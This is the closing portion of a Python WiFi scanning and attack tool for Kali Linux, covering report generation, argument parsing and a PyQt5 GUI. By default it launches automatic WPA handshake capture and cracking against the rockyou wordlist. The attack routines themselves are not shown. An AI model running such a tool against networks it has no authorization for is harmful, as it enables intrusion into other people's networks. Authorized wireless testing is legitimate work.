                .captured {{ background-color: #4caf50; color: white; }}
            </style>
        </head>
        <body>
            <h1>WiFi Scan Report</h1>
            <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>Interface: {self.interface}</p>
            <p>Total Networks: {len(self.networks)}</p>
            
            <table>
                <tr>
                    <th>ESSID</th>
                    <th>BSSID</th>
                    <th>Channel</th>
                    <th>Power</th>
                    <th>Encryption</th>
                    <th>WPS</th>
                    <th>Handshake</th>
                    <th>Attempts</th>
                </tr>
        """
        
        for network in sorted(self.networks.values(), key=lambda x: x.power, reverse=True):
            row_class = ""
            if network.wps:
                row_class += "wps "
            if network.handshake_captured:
                row_class += "captured"
            
            html_content += f"""
                <tr class="{row_class}">
                    <td>{network.essid}</td>
                    <td>{network.bssid}</td>
                    <td>{network.channel}</td>
                    <td>{network.power}</td>
                    <td>{network.encryption}</td>
                    <td>{'Yes' if network.wps else 'No'}</td>
                    <td>{'Yes' if network.handshake_captured else 'No'}</td>
                    <td>{network.attempts}</td>
                </tr>
            """
        
        html_content += """
            </table>
        </body>
        </html>
        """
        
        try:
            with open(report_file, 'w') as f:
                f.write(html_content)
            
            self.logger.info(f"HTML report generated: {report_file}")
            
        except Exception as e:
            self.logger.error(f"Error generating report: {e}")
    
    def cleanup(self):
        """Cleanup resources and stop monitor mode"""
        self.logger.info("Cleaning up...")
        self.running = False
        
        if self.monitor_mode_active:
            self.stop_monitor_mode()
        
        # Generate final report
        if self.networks:
            self.save_results()
            self.generate_report()
        
        self.logger.info("Cleanup completed")

def main():
    """Main function with argument parsing"""
    parser = argparse.ArgumentParser(description="Advanced WiFi Scanner for Kali Linux")
    parser.add_argument("-i", "--interface", default="wlan0", help="Wireless interface to use")
    parser.add_argument("-o", "--output", default="./wifi_scan_results", help="Output directory")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Scan duration per tool")
    parser.add_argument("-a", "--attempts", type=int, default=3, help="Max attempts per network")
    parser.add_argument("-w", "--wordlist", default="/usr/share/wordlists/rockyou.txt", help="Path to wordlist for cracking handshakes")
    parser.add_argument("--scan-only", action="store_true", help="Only scan, don't attack")
    parser.add_argument("--no-monitor", action="store_true", help="Don't use monitor mode")
    parser.add_argument("--gui", action="store_true", help="Launch the PyQt5 GUI")
    args = parser.parse_args()
    
    # If GUI mode requested, launch PyQt5 GUI
    if args.gui:
        try:
            from PyQt5 import QtWidgets, QtCore
        except ImportError:
            print("PyQt5 is not installed. Please install it with 'pip install PyQt5'.")
            sys.exit(1)

        class WiFiScannerGUI(QtWidgets.QMainWindow):
            def __init__(self):
                super().__init__()
                self.setWindowTitle("Advanced WiFi Scanner GUI")
                self.setGeometry(100, 100, 1000, 700)
                self.scanner = WiFiScanner(interface=args.interface, output_dir=args.output)
                self.scanner.max_attempts = args.attempts
                self.scanner.scan_duration = args.duration
                self.scanner.wordlist = args.wordlist
                self.init_ui()

            def init_ui(self):
                tabs = QtWidgets.QTabWidget()
                self.setCentralWidget(tabs)

                # Dashboard Tab
                dashboard = QtWidgets.QWidget()
                dash_layout = QtWidgets.QVBoxLayout()
                self.status_label = QtWidgets.QLabel("Status: Ready")
                dash_layout.addWidget(self.status_label)
                dashboard.setLayout(dash_layout)
                tabs.addTab(dashboard, "Dashboard")

                # Scan Tab
                scan_tab = QtWidgets.QWidget()
                scan_layout = QtWidgets.QVBoxLayout()
                self.scan_btn = QtWidgets.QPushButton("Comprehensive Scan")
                self.scan_btn.clicked.connect(self.run_scan)
                scan_layout.addWidget(self.scan_btn)
                self.scan_results = QtWidgets.QTextEdit()
                scan_layout.addWidget(self.scan_results)
                scan_tab.setLayout(scan_layout)
                tabs.addTab(scan_tab, "Scan")

                # Attack Tab
                attack_tab = QtWidgets.QWidget()
                attack_layout = QtWidgets.QVBoxLayout()
                self.attack_btn = QtWidgets.QPushButton("Auto Capture & Attack")
                self.attack_btn.clicked.connect(self.run_attack)
                attack_layout.addWidget(self.attack_btn)
                self.attack_results = QtWidgets.QTextEdit()
                attack_layout.addWidget(self.attack_results)
                attack_tab.setLayout(attack_layout)
                tabs.addTab(attack_tab, "Attack")

                # Results Tab
                results_tab = QtWidgets.QWidget()
                results_layout = QtWidgets.QVBoxLayout()
                self.report_btn = QtWidgets.QPushButton("Generate HTML Report")
                self.report_btn.clicked.connect(self.generate_report)
                results_layout.addWidget(self.report_btn)
                self.report_status = QtWidgets.QLabel("")
                results_layout.addWidget(self.report_status)
                results_tab.setLayout(results_layout)
                tabs.addTab(results_tab, "Results")

                # Settings Tab
                settings_tab = QtWidgets.QWidget()
                settings_layout = QtWidgets.QFormLayout()
                self.interface_input = QtWidgets.QLineEdit(args.interface)
                self.output_input = QtWidgets.QLineEdit(args.output)
                self.duration_input = QtWidgets.QSpinBox()
                self.duration_input.setValue(args.duration)
                self.attempts_input = QtWidgets.QSpinBox()
                self.attempts_input.setValue(args.attempts)
                self.wordlist_input = QtWidgets.QLineEdit(args.wordlist)
                settings_layout.addRow("Interface", self.interface_input)
                settings_layout.addRow("Output Dir", self.output_input)
                settings_layout.addRow("Scan Duration", self.duration_input)
                settings_layout.addRow("Max Attempts", self.attempts_input)
                settings_layout.addRow("Wordlist", self.wordlist_input)
                settings_tab.setLayout(settings_layout)
                tabs.addTab(settings_tab, "Settings")

            def run_scan(self):
                self.status_label.setText("Status: Scanning...")
                QtWidgets.QApplication.processEvents()
                self.scanner.interface = self.interface_input.text()
                self.scanner.output_dir = self.output_input.text()
                self.scanner.scan_duration = self.duration_input.value()
                self.scanner.max_attempts = self.attempts_input.value()
                self.scanner.wordlist = self.wordlist_input.text()
                networks = self.scanner.comprehensive_scan()
                result_text = "\n".join([f"{n.essid} ({n.bssid}) - {n.encryption} - Power: {n.power}" for n in networks.values()])
                self.scan_results.setText(result_text)
                self.status_label.setText("Status: Scan Complete")

            def run_attack(self):
                self.status_label.setText("Status: Attacking...")
                QtWidgets.QApplication.processEvents()
                self.scanner.interface = self.interface_input.text()
                self.scanner.output_dir = self.output_input.text()
                self.scanner.scan_duration = self.duration_input.value()
                self.scanner.max_attempts = self.attempts_input.value()
                self.scanner.wordlist = self.wordlist_input.text()
                self.scanner.auto_capture_with_retry()
                self.attack_results.setText("Attack completed. See logs and output directory for details.")
                self.status_label.setText("Status: Attack Complete")

            def generate_report(self):
                self.scanner.generate_report()
                self.report_status.setText("HTML report generated in output directory.")

        app = QtWidgets.QApplication(sys.argv)
        window = WiFiScannerGUI()
        window.show()
        sys.exit(app.exec_())
    else:
        # Check if running as root
        if os.geteuid() != 0:
            print("This script requires root privileges. Please run with sudo.")
            sys.exit(1)
        # Initialize scanner
        scanner = WiFiScanner(interface=args.interface, output_dir=args.output)
        scanner.max_attempts = args.attempts
        scanner.scan_duration = args.duration
        scanner.wordlist = args.wordlist
        # Check dependencies
        if not scanner.check_dependencies():
            sys.exit(1)
        try:
            if args.scan_only:
                # Perform single comprehensive scan
                scanner.comprehensive_scan()
                scanner.save_results()
                scanner.generate_report()
            else:
                # Start automatic capture with retry
                scanner.auto_capture_with_retry()
        except KeyboardInterrupt:
            scanner.logger.info("Scan interrupted by user")
        except Exception as e:
            scanner.logger.error(f"Unexpected error: {e}")
        finally:
            scanner.cleanup()

if __name__ == "__main__":
    main()
